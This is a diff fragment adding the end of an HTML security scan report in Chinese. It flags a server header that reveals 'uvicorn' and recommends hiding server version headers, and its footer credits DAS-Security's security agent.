+                        <pre>Server / X-Powered-By: uvicorn</pre>
+                    </div>
+                    <div class="remediation-box">
+                        <strong>🛠️ 专家整改建议：</strong>
+                        <p>在 Nginx/Apache/Tomcat 配置文件中关闭 server_tokens 或移除 X-Powered-By 响应头</p>
+                    </div>
+                </div>
+            </div>
+            
+
+        <div class="footer">
+            <p>杭州安恒信息技术股份有限公司 (DAS-Security) · 恒脑安全智能体开发支持</p>
+            <p>报告生成时间：2026-08-26 13:05:26 | 本报告受数字签名与日志审计保护</p>
+        </div>
+    </div>
+</body>
+</html>
